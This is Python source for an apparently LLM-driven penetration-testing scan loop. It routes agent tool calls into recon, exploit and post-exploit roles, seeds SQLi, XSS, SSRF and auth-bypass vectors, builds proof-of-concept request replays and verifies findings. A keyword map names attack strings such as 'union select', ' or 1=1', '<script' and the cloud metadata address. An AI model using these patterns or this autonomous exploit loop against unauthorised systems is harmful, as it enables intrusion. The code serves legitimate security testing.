        if phase == "data_access" and capability in {"report", "chain", "review"}:
            return "chain_closure"
        return phase

    @staticmethod
    def _action_capability(name: str, args: dict[str, Any] | Any) -> str:
        if name in {"verify_finding"}:
            return "review"
        if name in {"query_findings", "query_scan_memory"}:
            return "memory"
        if name in {"link_chain"}:
            return "chain"
        if name in {"finish_scan", "think", "wait"}:
            return "control" if name != "think" else "plan"
        if name in {"report_finding"}:
            return "report"
        if name in {"fingerprint_target", "load_playbook", "list_playbooks"}:
            return "recon"
        if name.startswith("browser_"):
            return "browse"
        if name in {"http_request"}:
            return "probe"
        if name in {"shell_exec", "python_exec"}:
            return "exploit"
        if name == "run_skill" and isinstance(args, dict):
            skill = str(args.get("skill", args.get("_skill_override", ""))).lower()
            if skill in {"enumerate_endpoints", "test_sensitive_files", "test_infra", "test_misconfig", "fingerprint_target"}:
                return "recon"
            if skill in {"post_auth_enum", "test_api_security"}:
                return "retrieve"
            if skill in {"test_injection", "attempt_auth", "test_idor", "test_xss", "test_ssrf", "test_auth_deep", "test_business_logic", "test_csrf", "test_crypto"}:
                return "exploit"
        return "probe"

    @staticmethod
    def _normalize_tool_args(name: str, args: dict[str, Any] | Any) -> dict[str, Any] | Any:
        if not isinstance(args, dict):
            return args
        normalized = dict(args)
        if name == "shell_exec" and not normalized.get("command") and normalized.get("cmd"):
            normalized["command"] = normalized["cmd"]
        return normalized

    @classmethod
    def _role_allows_action(cls, role: str, name: str, args: dict[str, Any] | Any) -> bool:
        allowed = cls._ROLE_ALLOWED_CAPABILITIES.get(role or "recon_worker", set())
        if not allowed:
            return True
        return cls._action_capability(name, args) in allowed

    @classmethod
    def _phase_allows_action(cls, branch: BranchState, name: str, args: dict[str, Any] | Any) -> bool:
        if branch.role != "post_exploit_worker":
            return True
        allowed = cls._POST_EXPLOIT_PHASE_ALLOWED_CAPABILITIES.get(branch.phase or "chain_closure", set())
        if not allowed:
            return True
        return cls._action_capability(name, args) in allowed

    def _seed_vector_candidates(self) -> None:
        """Seed the evergreen candidates the loop must exhaust for the surface."""
        try:
            from vxis.interaction.surface import TargetKind as _TK
        except Exception:
            _TK = None

        if _TK is not None and self._target_kind == _TK.DESKTOP:
            seeds = [
                ("desktop:local-storage-secrets", "DESK-LSS-001", "Local storage secrets", 90),
                ("desktop:signature-audit", "DESK-SIG-001", "Code signature trust boundary", 80),
                ("desktop:dylib-hijack", "DESK-DYL-001", "Dylib hijack surface", 80),
                ("desktop:ipc-injection", "DESK-IPC-001", "IPC injection surface", 70),
            ]
        else:
            seeds = [
                ("web:auth-bypass", "WEB-AUTH-001", "Authentication bypass or weak login", 95),
                ("web:sqli", "WEB-SQLI-001", "SQL injection toward DB/admin data", 95),
                ("web:idor", "WEB-AC-001", "IDOR or broken access control", 90),
                ("web:sensitive-files", "WEB-MISCONF-001", "Sensitive files or exposed config", 85),
                ("web:dir-bruteforce", "WEB-INFRA-001", "Hidden routes/directories", 75),
                ("web:xss", "WEB-XSS-001", "XSS toward session theft", 70),
                ("web:cve-scan", "WEB-INFRA-002", "Known CVE/template scan", 65),
                ("web:ssrf", "WEB-SSRF-001", "SSRF/internal reachability", 60),
            ]

        for cid, vid, title, priority in seeds:
            self.state.ensure_vector_candidate(
                cid,
                vid,
                title,
                priority=priority,
                evidence="seeded from target surface",
            )

    def _emit_event(self, event_type: str, data: dict[str, Any]) -> None:
        if self._event_callback is None:
            return
        try:
            self._event_callback(event_type, data)
        except Exception:
            logger.debug("scan loop event_callback failed for %s", event_type, exc_info=True)

    @staticmethod
    def _truncate_ui_text(value: Any, limit: int = 96) -> str:
        text = str(value).replace("\n", " ").strip()
        if len(text) <= limit:
            return text
        return text[: limit - 3] + "..."

    def _ui_action_details(self, name: str, args: dict[str, Any] | Any) -> tuple[str, str, str, str]:
        vector_id = name
        method = "TOOL"
        endpoint = self.state.target
        summary = name

        if not isinstance(args, dict):
            return vector_id, method, endpoint, summary

        if name == "run_skill":
            skill = self._truncate_ui_text(args.get("skill") or "unknown", 40)
            vector_id = f"skill:{skill}"
            method = "SKILL"
            endpoint = self._truncate_ui_text(args.get("target_url") or self.state.target, 80)
            summary = f"run_skill {skill}"
            return vector_id, method, endpoint, summary

        if name == "http_request":
            method = str(args.get("method") or "HTTP").upper()
            endpoint = self._truncate_ui_text(args.get("url") or self.state.target, 80)
            summary = f"{method} {endpoint}"
            return vector_id, method, endpoint, summary

        if name == "wait":
            seconds = self._truncate_ui_text(args.get("seconds") or "0", 12)
            return "scan:wait", "WAIT", f"{seconds}s", f"wait {seconds}s"

        if name.startswith("browser_"):
            method = "BROWSER"
            endpoint = self._truncate_ui_text(
                args.get("url")
                or args.get("selector")
                or args.get("form_selector")
                or args.get("expression")
                or self.state.target,
                80,
            )
            summary = f"{name} {endpoint}"
            return vector_id, method, endpoint, summary

        if name in ("shell_exec", "python_exec"):
            method = "EXEC"
            endpoint = self._truncate_ui_text(
                args.get("command") or args.get("cmd") or args.get("code") or self.state.target,
                80,
            )
            summary = f"{name} {endpoint}"
            return vector_id, method, endpoint, summary

        if name == "report_finding":
            ftype = self._truncate_ui_text(args.get("finding_type") or "finding", 40)
            vector_id = f"finding:{ftype}"
            method = "REPORT"
            endpoint = self._truncate_ui_text(
                args.get("affected_component") or args.get("title") or self.state.target,
                80,
            )
            summary = f"report {ftype}"
            return vector_id, method, endpoint, summary

        if name == "finish_scan":
            return "scan:finish", "CONTROL", self.state.target, "finish scan"

        for key in (
            "url",
            "target_url",
            "affected_component",
            "path",
            "selector",
            "form_selector",
            "title",
            "name",
        ):
            value = args.get(key)
            if value:
                endpoint = self._truncate_ui_text(value, 80)
                break

        summary = f"{name} {endpoint}"
        return vector_id, method, endpoint, summary

    def _emit_brain_status(self, summary: str, *, vector_id: str = "scan_loop") -> None:
        self._emit_event(
            "brain_thinking",
            {
                "phase": "scan_loop",
                "iteration": self.state.iteration,
                "max_iters": self.state.max_iters,
                "vector_count": 1,
                "vectors": [
                    {
                        "id": vector_id,
                        "reasoning": self._truncate_ui_text(summary, 220),
                    }
                ],
            },
        )

    def _build_report_finding_args(
        self,
        *,
        title: str,
        severity: str,
        finding_type: str,
        affected_component: str,
        description: str,
        impact: str,
        technical_analysis: str,
        poc_description: str,
        poc_script_code: str,
        remediation_steps: str,
        endpoint: str = "",
        method: str = "",
        cwe: str = "",
        extra_evidence: list[dict[str, str]] | None = None,
    ) -> dict[str, Any]:
        _safe_poc = _sanitize_evidence_text(poc_script_code, limit=4000)
        args = {
            "title": title,
            "severity": severity,
            "finding_type": finding_type,
            "affected_component": affected_component,
            "description": description,
            "impact": impact,
            "technical_analysis": technical_analysis,
            "poc_description": poc_description,
            "poc_script_code": _safe_poc,
            "remediation_steps": remediation_steps,
            "endpoint": endpoint or affected_component,
            "method": method,
            "cwe": cwe,
            # Keep legacy alias populated so older downstream code still sees it.
            "evidence": _safe_poc,
        }
        if extra_evidence:
            args["extra_evidence"] = list(extra_evidence)
        return args

    def _compact_local_reasoning_blob(self, value: Any, *, limit: int) -> str:
        text = _sanitize_evidence_text(str(value or ""), limit=max(120, limit * 2))
        if not text:
            return ""
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if len(lines) <= 6 and len(text) <= limit:
            return text[:limit]
        picked: list[str] = []
        keywords = ("http/", "host:", "payload", "baseline", "control", "status", "response", "error", "token", "cookie", "admin", "select", "union")
        for line in lines:
            lower = line.lower()
            if any(token in lower for token in keywords):
                picked.append(line)
            if len(picked) >= 6:
                break
        if not picked:
            picked = lines[:6]
        compact = "\n".join(picked)
        return compact[:limit]

    def _compact_local_finding_payload(self, args: dict[str, Any]) -> dict[str, Any]:
        if self._llm_discipline_profile() != "local_strict":
            return dict(args)
        compact = dict(args)
        compact["description"] = str(compact.get("description", ""))[:220]
        compact["impact"] = str(compact.get("impact", ""))[:240]
        compact["technical_analysis"] = self._compact_local_reasoning_blob(
            compact.get("technical_analysis", ""),
            limit=520,
        )
        compact["poc_description"] = self._compact_local_reasoning_blob(
            compact.get("poc_description", ""),
            limit=420,
        )
        compact["poc_script_code"] = self._compact_local_reasoning_blob(
            compact.get("poc_script_code", ""),
            limit=1200,
        )
        compact["evidence"] = self._compact_local_reasoning_blob(
            compact.get("evidence", compact.get("poc_script_code", "")),
            limit=1200,
        )
        if compact.get("extra_evidence"):
            trimmed_extra: list[dict[str, Any]] = []
            for item in list(compact.get("extra_evidence") or [])[:2]:
                if not isinstance(item, dict):
                    continue
                trimmed_extra.append({
                    **item,
                    "title": str(item.get("title", ""))[:60],
                    "content": self._compact_local_reasoning_blob(item.get("content", ""), limit=700),
                })
            compact["extra_evidence"] = trimmed_extra
        return compact

    @staticmethod
    def _callback_evidence_item(*, title: str, signal: str, payload: str, summary: str) -> dict[str, str]:
        return {
            "evidence_type": "callback",
            "title": title,
            "content_type": "text/plain",
            "content": (
                f"Signal: {signal}\n"
                f"Payload: {payload}\n"
                f"Summary: {summary}"
            )[:4000],
        }

    @staticmethod
    def _retrieval_evidence_item(*, title: str, retrieval_kind: str, summary: str, sample: str) -> dict[str, str]:
        return {
            "evidence_type": "retrieval",
            "title": title,
            "content_type": "text/plain",
            "content": (
                f"Retrieval kind: {retrieval_kind}\n"
                f"Summary: {summary}\n\n"
                f"Sample:\n{_sanitize_evidence_text(sample, limit=3000)}"
            )[:4000],
        }

    @staticmethod
    def _exfil_evidence_item(*, title: str, summary: str, sample: str) -> dict[str, str]:
        return {
            "evidence_type": "exfil",
            "title": title,
            "content_type": "text/plain",
            "content": (
                f"Summary: {summary}\n\n"
                f"Sample:\n{_sanitize_evidence_text(sample, limit=3000)}"
            )[:4000],
        }

    def _build_reflected_get_poc(
        self,
        *,
        url: str,
        param: str,
        payload: str,
        control: dict[str, Any],
        response_preview: str,
    ) -> str:
        parsed = urlparse(url)
        path = parsed.path or "/"
        original_params = parse_qs(parsed.query, keep_blank_values=True)
        original_value = ""
        if param in original_params and original_params[param]:
            original_value = original_params[param][0]
        payload_params = dict(original_params)
        payload_params[param] = [original_value + payload]
        baseline_query = urlencode({k: v[0] for k, v in original_params.items()}) if original_params else ""
        payload_query = urlencode({k: v[0] for k, v in payload_params.items()})
        baseline_target = path + (f"?{baseline_query}" if baseline_query else "")
        payload_target = path + (f"?{payload_query}" if payload_query else "")
        host = parsed.netloc or urlparse(self.state.target).netloc or "target"
        baseline_preview = str(control.get("baseline_preview", ""))[:500]
        payload_preview = str(control.get("payload_preview", response_preview))[:700]
        baseline_status = control.get("baseline_status", "?")
        payload_status = control.get("payload_status", "?")
        return (
            f"GET {baseline_target} HTTP/1.1\n"
            f"Host: {host}\n\n"
            f"HTTP/1.1 {baseline_status}\n\n"
            f"{baseline_preview}\n\n"
            f"GET {payload_target} HTTP/1.1\n"
            f"Host: {host}\n\n"
            f"HTTP/1.1 {payload_status}\n\n"
            f"{payload_preview}"
        )

    def _build_simple_http_poc(
        self,
        *,
        url: str,
        method: str = "GET",
        status: Any = "?",
        response_preview: str,
    ) -> str:
        parsed = urlparse(url)
        host = parsed.netloc or urlparse(self.state.target).netloc or "target"
        target = parsed.path or "/"
        if parsed.query:
            target += f"?{parsed.query}"
        preview = _sanitize_evidence_text(response_preview, limit=2500)
        return (
            f"{method.upper()} {target} HTTP/1.1\n"
            f"Host: {host}\n\n"
            f"HTTP/1.1 {status}\n\n"
            f"{preview}"
        )

    def _settle_branches_after_chain(self, finding_ids: list[str]) -> None:
        chain_ids = {str(fid) for fid in finding_ids if fid}
        if not chain_ids:
            return
        findings_by_id: dict[str, dict[str, Any]] = {}
        try:
            from vxis.agent.tools.finding_tools import _get_findings
            findings_by_id = {
                str(item.get("id")): item
                for item in (_get_findings() or [])
                if isinstance(item, dict) and item.get("id")
            }
        except Exception:
            findings_by_id = {}

        branch_ids_to_settle: set[str] = set()
        for fid in chain_ids:
            finding = findings_by_id.get(fid) or {}
            if finding:
                for branch_id in self._parent_branch_ids_for_finding(finding):
                    branch_ids_to_settle.add(branch_id)
        for branch in self.state.branches.values():
            if branch.status in _TERMINAL_BRANCH_STATUSES:
                continue
            if branch.source_finding_id and branch.source_finding_id in chain_ids:
                branch_ids_to_settle.add(branch.id)
                if branch.parent_branch_id:
                    branch_ids_to_settle.add(branch.parent_branch_id)
                branch_ids_to_settle.update(branch.child_ids)
        for branch_id in list(branch_ids_to_settle):
            branch = self.state.branches.get(branch_id)
            if branch is None:
                continue
            if branch.parent_branch_id:
                branch_ids_to_settle.add(branch.parent_branch_id)
            branch_ids_to_settle.update(branch.child_ids)

        for branch in self.state.branches.values():
            if branch.status in _TERMINAL_BRANCH_STATUSES:
                continue
            if branch.id in branch_ids_to_settle:
                branch.status = "proven"
                branch.last_report = (branch.last_report or "linked into attack chain")[:160]
                continue
            if branch.parent_branch_id and branch.parent_branch_id in branch_ids_to_settle:
                branch.status = "exhausted"
                branch.last_report = (branch.last_report or "superseded by linked attack chain")[:160]

    async def _dispatch_report_finding_checked(
        self,
        args: dict[str, Any],
        *,
        require_confirmed: bool = True,
    ) -> ToolResult:
        args = self._compact_local_finding_payload(args)
        severity = str(args.get("severity", "")).lower()
        if severity in {"high", "critical"} and "verify_finding" in self.registry.list_tools():
            verify_args = {
                "title": args.get("title", ""),
                "severity": args.get("severity", ""),
                "finding_type": args.get("finding_type", ""),
                "affected_component": args.get("affected_component", ""),
                "description": args.get("description", ""),
                "impact": args.get("impact", ""),
                "technical_analysis": args.get("technical_analysis", ""),
                "poc_description": args.get("poc_description", ""),
                "poc_script_code": args.get("poc_script_code", ""),
                "evidence": args.get("evidence", ""),
            }
            verdict_result = await self.registry.dispatch("verify_finding", verify_args)
            if verdict_result.ok:
                verdict_data = verdict_result.data or {}
                verdict = str(verdict_data.get("verdict", "UNCONFIRMED"))
                reasoning = str(verdict_data.get("reasoning", "")) or f"Verifier returned {verdict}."
                confidence = str(verdict_data.get("confidence", "low"))
                self.state.verdict_counts[verdict] = self.state.verdict_counts.get(verdict, 0) + 1
                _belief_entry = {
                    "iter": self.state.iteration,
                    "title": args.get("title", ""),
                    "severity": args.get("severity", ""),
                    "finding_type": args.get("finding_type", ""),
                    "affected_component": args.get("affected_component", ""),
                    "confidence": confidence,
                    "reasoning": reasoning[:300],
                }
                if verdict == "CONFIRMED":
                    self.state.confirmed_findings.append(_belief_entry)
                elif verdict == "REFUTED":
                    self.state.refuted_findings.append(_belief_entry)
                self._record_verifier_decision(
                    args=args,
                    verdict=verdict,
                    reasoning=reasoning,
                    confidence=confidence,
                )
                self.state.add_message("tool", {
                    "name": "verify_finding",
                    "args": verify_args,
                    "result": {
                        "ok": True,
                        "summary": verdict_result.summary,
                        "data": verdict_data,
                    },
                })
                if verdict != "CONFIRMED" and require_confirmed:
                    return ToolResult(
                        ok=False,
                        summary=(
                            "report_finding BLOCKED by auto-verifier "
                            f"({verdict}). Reason: {reasoning[:220]}"
                        ),
                        data={"verifier_blocked": True, "verdict": verdict, "reasoning": reasoning},
                        error="verifier_blocked",
                    )
                if verdict == "REFUTED":
                    return ToolResult(
                        ok=False,
                        summary=(
                            "report_finding BLOCKED by auto-verifier "
                            f"(REFUTED). Reason: {reasoning[:220]}"
                        ),
                        data={"verifier_blocked": True, "verdict": verdict, "reasoning": reasoning},
                        error="verifier_blocked",
                    )

        result = await self.registry.dispatch("report_finding", args)
        if result.ok:
            self._mark_candidates_for_finding(args)
            finding_id = ""
            if isinstance(result.data, dict):
                finding_id = str(result.data.get("id") or "")
            if finding_id:
                self._spawn_followup_branches_from_finding(finding_id, args)
                await self._maybe_auto_link_chain(finding_id)
        return result

    async def _promote_direct_run_skill_result(
        self,
        real_skill: str,
        data: dict[str, Any],
    ) -> None:
        if real_skill == "test_injection":
            for finding in (data.get("findings") or []):
                inj_sev = finding.get("severity", "medium")
                if inj_sev not in ("high", "critical"):
                    continue
                inj_url = data.get("url", self.state.target)
                inj_param = data.get("param", finding.get("param", "?"))
                control = finding.get("control", {}) or {}
                payload_text = finding.get("payload", "")
                poc_blob = self._build_reflected_get_poc(
                    url=inj_url,
                    param=inj_param,
                    payload=payload_text,
                    control=control,
                    response_preview=finding.get("response_preview", "")[:1200],
                )
                args = {
                    "title": f"{finding['type'].upper()} on {inj_param}",
                    "severity": inj_sev,
                    "finding_type": finding["type"],
                    "affected_component": inj_url,
                    "description": f"Payload: {payload_text[:80]}",
                    "evidence": finding.get("response_preview", finding.get("evidence", ""))[:500],
                }
                args.update(self._build_report_finding_args(
                    title=args["title"],
                    severity=inj_sev,
                    finding_type=finding["type"],
                    affected_component=inj_url,
                    description=f"Injection behavior was observed on parameter {inj_param}.",
                    impact="Successful injection may expose backend data, execute attacker-controlled logic, or cross trust boundaries depending on the sink.",
                    technical_analysis=(
                        f"The injection skill recorded baseline/control data {control} alongside the payload response, "
                        "which indicates the parameter reacts differently under attacker-controlled input."
                    ),
                    poc_description="Replay the payload against the same parameter and compare the baseline response to the injected response or delay/output delta.",
                    poc_script_code=poc_blob,
                    remediation_steps="Apply sink-specific input handling such as parameterized queries, output encoding, and strict server-side validation.",
                    endpoint=inj_url,
                    method="GET",
                ))
                await self._dispatch_report_finding_checked(args)
            return

        if real_skill == "test_xss":
            for finding in (data.get("findings") or []):
                xss_sev = finding.get("severity", "high")
                xss_url = data.get("url", self.state.target)
                xss_param = finding.get("param", data.get("param", "?"))
                payload = finding.get("payload", "")[:200]
                response_preview = finding.get("response_preview", finding.get("evidence", ""))[:1200]
                control = finding.get("control", {}) or {}
                xss_poc = self._build_reflected_get_poc(
                    url=xss_url,
                    param=xss_param,
                    payload=payload,
                    control=control,
                    response_preview=response_preview,
                )
                args = {
                    "title": f"XSS ({finding.get('type', 'reflected')}) on {xss_param}",
                    "severity": xss_sev,
                    "finding_type": f"xss_{finding.get('type', 'reflected')}",
                    "affected_component": xss_url,
                    "description": f"Cross-site scripting payload reflected or executed via parameter {xss_param}.",
                    "evidence": response_preview,
                }
                if xss_sev in ("high", "critical"):
                    args.update(self._build_report_finding_args(
                        title=args["title"],
                        severity=xss_sev,
                        finding_type=args["finding_type"],
                        affected_component=xss_url,
                        description=args["description"],
                        impact="An attacker may execute script in a victim browser, enabling session theft or authenticated action execution.",
                        technical_analysis=(
                            "The XSS skill returned a concrete payload and response evidence indicating that attacker-controlled script content was reflected or executed. "
                            f"Baseline/control data: {control}."
                        ),
                        poc_description="Submit the supplied payload to the vulnerable parameter and confirm that it is reflected/executed in the response context.",
                        poc_script_code=xss_poc,
                        remediation_steps="Contextually encode untrusted input, apply output escaping, and deploy CSP as a secondary control.",
                        endpoint=xss_url,
                        method="GET",
                        cwe="CWE-79",
                    ))
                await self._dispatch_report_finding_checked(args)
            return

        if real_skill == "test_ssrf":
            for finding in (data.get("findings") or []):
                ssrf_sev = finding.get("severity", "high")
                ssrf_url = data.get("url", self.state.target)
                ssrf_param = finding.get("param", data.get("param", "?"))
                payload = finding.get("payload", "")[:200]
                response_preview = finding.get("response_preview", finding.get("evidence", ""))[:1200]
                control = finding.get("control", {}) or {}
                matched_signal = str(control.get("matched_signal") or finding.get("type", "internal_response"))
                callback_summary = response_preview[:500] or str(finding.get("evidence", ""))[:500]
                self.state.record_callback_observation(
                    finding_type="ssrf",
                    component=ssrf_url,
                    signal=matched_signal,
                    payload=payload,
                    summary=callback_summary,
                )
                ssrf_poc = self._build_reflected_get_poc(
                    url=ssrf_url,
                    param=ssrf_param,
                    payload=payload,
                    control=control,
                    response_preview=response_preview,
                )
                args = {
                    "title": f"SSRF via {finding.get('type', 'ssrf')} on {ssrf_param}",
                    "severity": ssrf_sev,
                    "finding_type": "ssrf",
                    "affected_component": ssrf_url,
                    "description": f"Server-side request behavior was influenced via parameter {ssrf_param}.",
                    "evidence": response_preview,
                }
                if ssrf_sev in ("high", "critical"):
                    args.update(self._build_report_finding_args(
                        title=args["title"],
                        severity=ssrf_sev,
                        finding_type="ssrf",
                        affected_component=ssrf_url,
                        description=args["description"],
                        impact="Attackers may force the server to reach internal services, cloud metadata endpoints, or trust-bound internal resources.",
                        technical_analysis=(
                            "The SSRF skill produced a payload and corresponding response preview suggesting server-side fetching or internal reachability. "
                            f"Baseline/control data: {control}."
                        ),
                        poc_description="Submit the SSRF payload to the target parameter and confirm that the server fetches or leaks data from the supplied internal URL.",
                        poc_script_code=ssrf_poc,
                        remediation_steps="Restrict outbound requests, enforce URL allowlists, and block internal address spaces from user-controlled fetches.",
                        endpoint=ssrf_url,
                        method="GET",
                        cwe="CWE-918",
                        extra_evidence=[
                            self._callback_evidence_item(
                                title="Callback / Internal Reachability",
                                signal=matched_signal,
                                payload=payload,
                                summary=callback_summary,
                            )
                        ],
                    ))
                await self._dispatch_report_finding_checked(args)

    def _emit_iteration_status(self, note: str) -> None:
        self.state.clear_waiting_reason()
        active_branches = self.state.active_branches()
        if active_branches:
            focus_branch = active_branches[0]
            self._emit_brain_status(
                f"iter {self.state.iteration}/{self.state.max_iters} - {note}. "
                f"Focus branch: {focus_branch.title}",
                vector_id=focus_branch.id,
            )
            self._emit_control_plane(note)
            return
        open_candidates = self.state.open_vector_candidates()
        if open_candidates:
            focus = open_candidates[0]
            self._emit_brain_status(
                f"iter {self.state.iteration}/{self.state.max_iters} - {note}. "
                f"Focus: {focus.title}",
                vector_id=focus.id,
            )
        else:
            self._emit_brain_status(
                f"iter {self.state.iteration}/{self.state.max_iters} - {note}",
                vector_id="scan_loop",
            )
        self._emit_control_plane(note)

    def _emit_action_progress(self, name: str, args: dict[str, Any] | Any, prefix: str) -> None:
        vector_id, method, endpoint, summary = self._ui_action_details(name, args)
        self.state.set_waiting_reason(f"{prefix}: {summary}")
        self._emit_brain_status(
            f"iter {self.state.iteration}/{self.state.max_iters} - {prefix}: {summary}",
            vector_id=vector_id,
        )
        self._emit_event(
            "attack",
            {
                "vector_id": vector_id,
                "method": method,
                "endpoint": endpoint,
            },
        )
        self._emit_control_plane(f"{prefix}: {summary}")

    def _emit_control_plane(self, note: str = "") -> None:
        import os

        telemetry: dict[str, Any] = {}
        proxy_status: dict[str, Any] = {}
        try:
            from vxis.agent.brain import (
                get_brain_decision_count as _get_brain_decision_count,
                get_llm_call_count as _get_llm_call_count,
                get_llm_usage_stats as _get_llm_usage_stats,
            )
            from vxis.agent.memory_compressor import get_memory_compression_stats
            from vxis.agent.tools.proxy_runtime import get_proxy_status_snapshot

            telemetry = _get_llm_usage_stats()
            telemetry["llm_calls"] = _get_llm_call_count()
            telemetry["brain_decisions"] = _get_brain_decision_count()
            telemetry["memory_compression"] = get_memory_compression_stats()
            proxy_status = get_proxy_status_snapshot()
        except Exception:
            telemetry = {}
            proxy_status = {}
        if not telemetry.get("provider"):
            telemetry["provider"] = getattr(self.brain, "_provider", "")
        if not telemetry.get("model"):
            telemetry["model"] = getattr(self.brain, "_model", "")
        if not telemetry.get("base_url"):
            provider = str(telemetry.get("provider") or "").strip().lower()
            if provider == "ollama":
                telemetry["base_url"] = os.environ.get("VXIS_OLLAMA_BASE_URL", "").rstrip("/")
            elif provider == "llamacpp":
                telemetry["base_url"] = os.environ.get("VXIS_LLAMACPP_BASE_URL", "").rstrip("/")
        telemetry["discipline_profile"] = self._llm_discipline_profile()

        snapshot = self.state.control_plane_snapshot()
        focus = self._focus_branch()
        if focus is not None:
            snapshot["focus_branch"] = {
                "id": focus.id,
                "title": focus.title,
                "vector_id": focus.vector_id,
                "role": focus.role,
                "phase": focus.phase,
                "status": focus.status,
                "objective": focus.objective,
                "next_step": focus.next_step,
                "crown_jewel": focus.crown_jewel,
                "blocker": focus.blocker,
                "owner": focus.owner,
            }
        snapshot["blocking_branches"] = [
            {
                "id": branch.id,
                "title": branch.title,
                "vector_id": branch.vector_id,
                "status": branch.status,
                "role": branch.role,
                "phase": branch.phase,
                "priority": branch.priority,
                "attempts": branch.attempts,
                "objective": branch.objective,
                "next_step": branch.next_step,
                "blocker": branch.blocker,
            }
            for branch in self._blocking_finish_branches()[:4]
        ]
        snapshot["campaign_groups"] = self._campaign_groups_for_ui(limit=4)
        snapshot["focus_campaign"] = self._focus_campaign_for_ui()
        snapshot["memory_directives"] = [
            note for note in self.state.shared_notes
            if str(note).startswith("memory")
        ][-4:]
        snapshot["chain_candidates"] = self._suggest_chain_candidates(limit=3)
        snapshot["note"] = self._truncate_ui_text(note, 140) if note else ""
        snapshot["telemetry"] = telemetry
        snapshot["proxy"] = proxy_status
        self._latest_control_plane = dict(snapshot)
        self._emit_event("control_plane", snapshot)

    async def _maybe_autostart_proxy(self) -> None:
        import os
        try:
            from vxis.interaction.surface import TargetKind as _TK
            from vxis.agent.tools.proxy_runtime import get_proxy_runtime
        except Exception:
            return
        if os.environ.get("VXIS_PROXY_AUTOSTART", "1").strip().lower() in {"0", "false", "no"}:
            return
        if self._target_kind != _TK.WEB and not str(self.state.target).startswith(("http://", "https://")):
            return
        try:
            status = await get_proxy_runtime().start(
                port=int(os.environ.get("VXIS_PROXY_PORT", "8081")),
                backend=os.environ.get("VXIS_PROXY_BACKEND", "auto"),
            )
        except Exception as exc:
            logger.info("proxy autostart failed: %s", exc)
            return
        if status.get("running"):
            backend = status.get("backend") or "proxy"
            proxy_url = status.get("proxy_url") or ""
            self.state.add_shared_note(f"Proxy online: {backend} {proxy_url}".strip())
            self._emit_control_plane(f"Proxy online via {backend}")
        elif status.get("last_error"):
            self.state.add_shared_note(f"Proxy unavailable: {status.get('last_error')}")

    @staticmethod
    def _preview_args(args: Any) -> str:
        try:
            return json.dumps(args, default=str, ensure_ascii=False, sort_keys=True).lower()
        except Exception:
            return str(args).lower()

    def _candidate_ids_for_action(self, name: str, args: dict[str, Any] | Any) -> list[str]:
        """Infer which durable vector candidates a tool call is attempting."""
        if name == "finish_scan":
            return []
        blob = f"{name} {self._preview_args(args)}"
        candidates: list[str] = []

        if name == "run_skill" and isinstance(args, dict):
            skill = str(args.get("skill") or "").lower()
            skill_map = {
                "attempt_auth": ["web:auth-bypass"],
                "test_auth_deep": ["web:auth-bypass"],
                "test_injection": ["web:sqli"],
                "test_idor": ["web:idor"],
                "test_sensitive_files": ["web:sensitive-files"],
                "enumerate_endpoints": ["web:dir-bruteforce"],
                "test_xss": ["web:xss"],
                "test_ssrf": ["web:ssrf"],
                "test_local_storage_secrets": ["desktop:local-storage-secrets"],
                "test_signature_audit": ["desktop:signature-audit"],
                "test_dylib_hijack": ["desktop:dylib-hijack"],
                "test_ipc_injection": ["desktop:ipc-injection"],
            }
            candidates.extend(skill_map.get(skill, []))

        keyword_map = [
            ("sqlmap", "web:sqli"),
            ("sqli", "web:sqli"),
            ("union select", "web:sqli"),
            (" or 1=1", "web:sqli"),
            ("ffuf", "web:dir-bruteforce"),
            ("gobuster", "web:dir-bruteforce"),
            ("dirb", "web:dir-bruteforce"),
            ("nuclei", "web:cve-scan"),
            ("/api/users", "web:idor"),
            ("/api/orders", "web:idor"),
            ("idor", "web:idor"),
            ("jwt", "web:auth-bypass"),
            ("login", "web:auth-bypass"),
            ("password", "web:auth-bypass"),
            ("xss", "web:xss"),
            ("<script", "web:xss"),
            ("ssrf", "web:ssrf"),
            ("169.254.169.254", "web:ssrf"),
            ("../", "web:sensitive-files"),
            ("/ftp", "web:sensitive-files"),
            ("backup", "web:sensitive-files"),
        ]
        for needle, cid in keyword_map:
            if needle in blob:
                candidates.append(cid)

        if name == "browser_fill_form":
            candidates.append("web:auth-bypass")
        elif name == "browser_eval_js":
            candidates.append("web:xss")

        # Preserve order while removing duplicates and unknown candidates.
        seen: set[str] = set()
        result: list[str] = []
        for cid in candidates:
            if cid in self.state.vector_candidates and cid not in seen:
                seen.add(cid)
                result.append(cid)
        return result

    @staticmethod
    def _status_from_tool_result(result: ToolResult) -> str:
        if not result.ok:
            data = result.data if isinstance(result.data, dict) else {}
            if any(data.get(k) for k in ("egress_blocked", "surface_guard_blocked", "dedup", "blocked")):
                return "blocked"
            if str(result.error or "").strip().lower() in {"stuck_loop", "non_text_response"}:
                return "blocked"
            return "failed"
        text = f"{result.summary} {result.data}".lower()
        if any(tok in text for tok in (
            "confirmed", "vulnerable", "succeeded", "jwt payload",
            "sql injection", "xss", "idor", "admin", "token",
        )):
            return "found"
        if any(tok in text for tok in ("no finding", "not vulnerable", "nothing found", "no issue")):
            return "clean"
        return "attempted"

    def _mark_candidates_for_finding(self, args: dict[str, Any]) -> None:
        ftype = str(args.get("finding_type") or "").lower()
        title = str(args.get("title") or "").lower()
        text = f"{ftype} {title}"
        mapping = [
            (("sql", "sqli"), "web:sqli"),
            (("auth", "login", "jwt"), "web:auth-bypass"),
            (("idor", "access", "privilege"), "web:idor"),
            (("xss",), "web:xss"),
            (("ssrf",), "web:ssrf"),
            (("info", "sensitive", "disclosure", "traversal"), "web:sensitive-files"),
            (("cve",), "web:cve-scan"),
        ]
        for needles, cid in mapping:
            if any(n in text for n in needles) and cid in self.state.vector_candidates:
                self.state.record_attempt_outcome(
                    cid,
                    "report_finding",
                    args,
                    status="found",
                    summary=f"finding reported: {args.get('title', '')}",
                )

    def _mark_retryable_candidate(
        self,
        candidate_id: str,
        *,
        tool: str,
        summary: str,
        evidence: str = "",
    ) -> None:
        candidate = self.state.vector_candidates.get(candidate_id)
        if candidate is None:
            return
        candidate.status = "retryable"
        candidate.last_tool = tool[:80]
        candidate.last_summary = summary[:240]
        candidate.last_iter = self.state.iteration
        if evidence and evidence not in candidate.evidence:
            candidate.evidence = (candidate.evidence + "; " + evidence).strip("; ")
        self.state._sync_candidate_control_state(candidate)

    def _mark_family_probe_retryable(
        self,
        skill_name: str,
        *,
        url: str = "",
        round_num: int = 1,
        tested_params: list[str] | None = None,
    ) -> None:
        skill = str(skill_name).strip().lower()
        candidate_map = {
            "test_injection": "web:sqli",
            "test_xss": "web:xss",
            "test_ssrf": "web:ssrf",
        }
